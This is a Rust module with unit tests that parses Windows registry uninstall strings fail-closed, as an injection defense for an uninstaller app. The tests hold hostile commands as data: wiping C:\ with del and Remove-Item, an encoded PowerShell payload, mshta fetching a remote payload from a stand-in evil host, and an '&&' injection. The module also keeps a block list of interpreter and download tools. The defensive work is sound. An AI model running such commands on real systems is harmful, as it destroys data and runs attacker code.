//! Parses registry `UninstallString` values into a structured, executable
//! command — WITHOUT ever involving a shell.
//!
//! This module is the app's primary injection defense. An `UninstallString`
//! is attacker-influencable input: any installer (or malware posing as one)
//! writes whatever it wants there. Phase 3 will execute what this parser
//! returns, so the rules here are deliberately fail-closed:
//!
//! - MSI entries are reduced to a validated product-code GUID and nothing
//!   else; execution later rebuilds the canonical `msiexec.exe /x {GUID}`
//!   from scratch, so no attacker-controlled text ever reaches the command
//!   line.
//! - Direct executables are tokenized quote-aware (never `cmd /c`), and the
//!   program must end in `.exe` to classify at all.
//! - Interpreter/LOLBin invocations (`cmd`, `powershell`, `wscript`,
//!   `mshta`, `rundll32`, ...) are classified [`Classification::ManualOnly`]:
//!   shown to the user, never auto-executed. Some legitimate uninstallers do
//!   use them — that is a documented limitation, not an oversight, because
//!   auto-running an interpreter with registry-supplied arguments is exactly
//!   the primitive an attacker wants.
//!
//! Everything here is pure (no disk, no registry), which is what makes the
//! test corpus below possible on any platform. On-disk checks (does the
//! executable actually exist, is it inside the program's install location)
//! are Phase 3's second gate, layered on top of this one.

use serde::Serialize;

/// Hard cap on the raw string; a registry value longer than this is not a
/// plausible uninstall command and is rejected before any parsing work.
const MAX_COMMAND_LEN: usize = 2048;
/// Caps that bound worst-case work and serialized size, not real commands.
const MAX_ARGS: usize = 32;
const MAX_ARG_LEN: usize = 512;

/// Program stems that mean "this string runs an interpreter, not an
/// uninstaller binary". Matched case-insensitively on the file stem, so
/// `CMD.EXE`, `cmd`, and `C:\Windows\System32\cmd.exe` all hit.
const INTERPRETER_STEMS: &[&str] = &[
    "cmd",
    "powershell",
    "pwsh",
    "wscript",
    "cscript",
    "mshta",
    "rundll32",
    "regsvr32",
    "wmic",
    "curl",
    "bitsadmin",
    "certutil",
    "java",
    "javaw",
    "python",
    "node",
];

/// How the UI (and later the executor) should treat a parsed command.
#[derive(Serialize, Clone, Debug, PartialEq)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum Classification {
    /// Windows Installer product. Execution rebuilds `msiexec.exe /x {GUID}`
    /// from the validated GUID alone.
    Msi { product_code: String },
    /// A direct `.exe` invocation with tokenized arguments.
    Executable { path: String, args: Vec<String> },
    /// Parseable, but only safe to run by a human (interpreter invocations,
    /// non-.exe programs). The UI shows the raw string and opens no process.
    ManualOnly { reason: ManualReason },
}

#[derive(Serialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub enum ManualReason {
    InterpreterInvocation,
    NotAnExecutable,
}

#[derive(Serialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub enum ParseError {
    Empty,
    TooLong,
    /// `msiexec` was named but no valid `{GUID}` product code was found.
    UnparsableMsi,
    TooManyArguments,
    ArgumentTooLong,
}

/// Splits a command line the way `CommandLineToArgvW` broadly does for the
/// cases that occur in uninstall strings: double quotes group a token,
/// whitespace separates tokens. Deliberately simpler than full Windows
/// quoting lore (no `\"` escapes) — uninstall strings in the wild don't use
/// them, and a simpler tokenizer is an auditable tokenizer. Anything the
/// simple grammar can't express tokenizes conservatively and then fails the
/// `.exe` classification gate rather than guessing.
fn tokenize(input: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    for ch in input.chars() {
        match ch {
            '"' => in_quotes = !in_quotes,
            c if c.is_whitespace() && !in_quotes => {
                if !current.is_empty() {
                    tokens.push(std::mem::take(&mut current));
                }
            }
            c => current.push(c),
        }
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

/// The file stem of a program token, lowercased: `C:\W\S32\Cmd.EXE` -> `cmd`.
fn program_stem(token: &str) -> String {
    let name = token
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase();
    name.strip_suffix(".exe").unwrap_or(&name).to_string()
}

fn is_valid_product_code(candidate: &str) -> bool {
    let inner = match candidate
        .strip_prefix('{')
        .and_then(|s| s.strip_suffix('}'))
    {
        Some(inner) => inner,
        None => return false,
    };
    let groups: Vec<&str> = inner.split('-').collect();
    let expected_lens = [8usize, 4, 4, 4, 12];
    groups.len() == expected_lens.len()
        && groups
            .iter()
            .zip(expected_lens)
            .all(|(g, len)| g.len() == len && g.chars().all(|c| c.is_ascii_hexdigit()))
}

/// Extracts the product code from an msiexec invocation. Accepts the shapes
/// installers actually register — `/X{GUID}`, `/I{GUID}`, `/x {GUID}`,
/// `/uninstall {GUID}` — and ignores every other flag: whatever else the
/// string asked for, uninstalling is the only thing this app will rebuild.
fn msi_product_code(tokens: &[String]) -> Option<String> {
    let mut expect_guid_next = false;
    for token in &tokens[1..] {
        if expect_guid_next {
            if is_valid_product_code(token) {
                return Some(token.to_ascii_uppercase());
            }
            expect_guid_next = false;
            continue;
        }
        let lower = token.to_ascii_lowercase();
        for flag in ["/x", "/i", "-x", "-i"] {
            if let Some(rest) = lower.strip_prefix(flag) {
                if rest.is_empty() {
                    expect_guid_next = true;
                } else if is_valid_product_code(&token[flag.len()..]) {
                    return Some(token[flag.len()..].to_ascii_uppercase());
                }
            }
        }
        if lower == "/uninstall" || lower == "/package" {
            expect_guid_next = true;
        }
        if is_valid_product_code(token) {
            return Some(token.to_ascii_uppercase());
        }
    }
    None
}

/// Parses one raw `UninstallString`. Pure: no disk or registry access.
pub fn parse(raw: &str) -> Result<Classification, ParseError> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err(ParseError::Empty);
    }
    if trimmed.len() > MAX_COMMAND_LEN {
        return Err(ParseError::TooLong);
    }

    let tokens = tokenize(trimmed);
    let Some(program) = tokens.first() else {
        return Err(ParseError::Empty);
    };
    let stem = program_stem(program);

    if stem == "msiexec" {
        return match msi_product_code(&tokens) {
            Some(product_code) => Ok(Classification::Msi { product_code }),
            None => Err(ParseError::UnparsableMsi),
        };
    }

    if INTERPRETER_STEMS.contains(&stem.as_str()) {
        return Ok(Classification::ManualOnly {
            reason: ManualReason::InterpreterInvocation,
        });
    }

    // Unquoted paths with spaces ("C:\Program Files\Foo\unins.exe /S")
    // tokenize into fragments; rejoin tokens until one ends in `.exe`.
    // Guessing further than the first `.exe` boundary would let a crafted
    // string smuggle extra path segments, so the search stops there.
    let mut path = String::new();
    let mut args_start = tokens.len();
    for (i, token) in tokens.iter().enumerate() {
        if !path.is_empty() {
            path.push(' ');
        }
        path.push_str(token);
        if token.to_ascii_lowercase().ends_with(".exe") {
            args_start = i + 1;
            break;
        }
    }
    if args_start == tokens.len() && !path.to_ascii_lowercase().ends_with(".exe") {
        return Ok(Classification::ManualOnly {
            reason: ManualReason::NotAnExecutable,
        });
    }

    let args: Vec<String> = tokens[args_start..].to_vec();
    if args.len() > MAX_ARGS {
        return Err(ParseError::TooManyArguments);
    }
    if args.iter().any(|a| a.len() > MAX_ARG_LEN) {
        return Err(ParseError::ArgumentTooLong);
    }

    Ok(Classification::Executable { path, args })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn msi(code: &str) -> Classification {
        Classification::Msi {
            product_code: code.to_string(),
        }
    }

    // ---- Real-world shapes -------------------------------------------------

    #[test]
    fn quoted_inno_setup_style_parses_path_and_args() {
        let parsed = parse(r#""C:\Program Files (x86)\Foo\unins000.exe" /SILENT"#).unwrap();
        assert_eq!(
            parsed,
            Classification::Executable {
                path: r"C:\Program Files (x86)\Foo\unins000.exe".to_string(),
                args: vec!["/SILENT".to_string()],
            }
        );
    }

    #[test]
    fn unquoted_path_with_spaces_rejoins_up_to_the_exe_boundary() {
        let parsed = parse(r"C:\Program Files\Foo Bar\uninstall.exe /S --keep settings").unwrap();
        assert_eq!(
            parsed,
            Classification::Executable {
                path: r"C:\Program Files\Foo Bar\uninstall.exe".to_string(),
                args: vec![
                    "/S".to_string(),
                    "--keep".to_string(),
                    "settings".to_string()
                ],
            }
        );
    }

    #[test]
    fn msi_variants_all_normalize_to_the_uppercased_guid() {
        let guid = "{6F340107-F9AA-47C6-B54C-C3A19F11553C}";
        for raw in [
            format!("MsiExec.exe /X{guid}"),
            format!("MsiExec.exe /I{guid}"),
            format!("msiexec.exe /x {guid}"),
            format!(r"C:\Windows\System32\msiexec.exe /uninstall {guid} /qn"),
            format!("msiexec /X{}", guid.to_lowercase()),
        ] {
            assert_eq!(parse(&raw).unwrap(), msi(guid), "failed for: {raw}");
        }
    }

    #[test]
    fn quoted_args_survive_as_single_tokens() {
        let parsed = parse(r#""C:\Foo\u.exe" --log "C:\My Logs\out.txt""#).unwrap();
        assert_eq!(
            parsed,
            Classification::Executable {
                path: r"C:\Foo\u.exe".to_string(),
                args: vec!["--log".to_string(), r"C:\My Logs\out.txt".to_string()],
            }
        );
    }

    // ---- Hostile input -----------------------------------------------------

    #[test]
    fn interpreter_invocations_are_manual_only_never_executable() {
        for raw in [
            r#"cmd.exe /c "del /f /q C:\*""#,
            r"C:\Windows\System32\cmd.exe /c evil.bat",
            "powershell -enc SQBFAFgA",
            "pwsh -Command Remove-Item -Recurse C:\\",
            r"rundll32.exe evil.dll,Entry",
            r"wscript.exe C:\ProgramData\payload.vbs",
            "mshta.exe http://evil.example/payload.hta",
            "regsvr32 /s /u evil.dll",
        ] {
            assert_eq!(
                parse(raw).unwrap(),
                Classification::ManualOnly {
                    reason: ManualReason::InterpreterInvocation
                },
                "should be manual-only: {raw}"
            );
        }
    }

    #[test]
    fn interpreter_detection_is_not_fooled_by_case_or_path() {
        assert_eq!(
            parse(r"C:\WINDOWS\SYSTEM32\CMD.EXE /C whatever").unwrap(),
            Classification::ManualOnly {
                reason: ManualReason::InterpreterInvocation
            }
        );
    }

    #[test]
    fn msiexec_without_a_valid_guid_is_an_error_not_a_guess() {
        for raw in [
            "msiexec.exe /x {not-a-guid}",
            "msiexec.exe /x",
            "msiexec.exe /x {6F340107-F9AA-47C6-B54C}",
            "msiexec.exe /x {6F340107-F9AA-47C6-B54C-C3A19F11553G}", // 'G' not hex
            "msiexec.exe /qn",
        ] {
            assert_eq!(parse(raw), Err(ParseError::UnparsableMsi), "for: {raw}");
        }
    }

    #[test]
    fn shell_metacharacters_never_split_commands_because_there_is_no_shell() {
        // '&&' has no meaning to a tokenizer; it just becomes an argument.
        // What matters is that nothing here ever reaches cmd.exe to interpret.
        let parsed = parse(r#""C:\Foo\u.exe" && del C:\important"#).unwrap();
        match parsed {
            Classification::Executable { path, args } => {
                assert_eq!(path, r"C:\Foo\u.exe");
                assert_eq!(args, vec!["&&", "del", r"C:\important"]);
            }
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn non_exe_programs_are_manual_only() {
        for raw in [
            r"C:\ProgramData\payload.bat /S",
            r"C:\Foo\uninstall.com",
            r"C:\Foo\uninstall", // no extension at all
        ] {
            assert_eq!(
                parse(raw).unwrap(),
                Classification::ManualOnly {
                    reason: ManualReason::NotAnExecutable
                },
                "for: {raw}"
            );
        }
    }

    #[test]
    fn size_limits_fail_closed() {
        assert_eq!(parse(""), Err(ParseError::Empty));
        assert_eq!(parse("   "), Err(ParseError::Empty));
        assert_eq!(
            parse(&"x".repeat(MAX_COMMAND_LEN + 1)),
            Err(ParseError::TooLong)
        );

        let many_args = format!(r"C:\u.exe {}", "a ".repeat(MAX_ARGS + 1));
        assert_eq!(parse(&many_args), Err(ParseError::TooManyArguments));

        let long_arg = format!(r"C:\u.exe {}", "a".repeat(MAX_ARG_LEN + 1));
        assert_eq!(parse(&long_arg), Err(ParseError::ArgumentTooLong));
    }

    #[test]
    fn exe_boundary_stops_path_rejoining_so_segments_cannot_be_smuggled() {
        // Only the text up to the FIRST `.exe` becomes the path; the rest is
        // arguments, even if it looks like more path.
        let parsed = parse(r"C:\Foo\a.exe \..\..\Windows\System32\evil.exe").unwrap();
        assert_eq!(
            parsed,
            Classification::Executable {
                path: r"C:\Foo\a.exe".to_string(),
                args: vec![r"\..\..\Windows\System32\evil.exe".to_string()],
            }
        );
    }
}
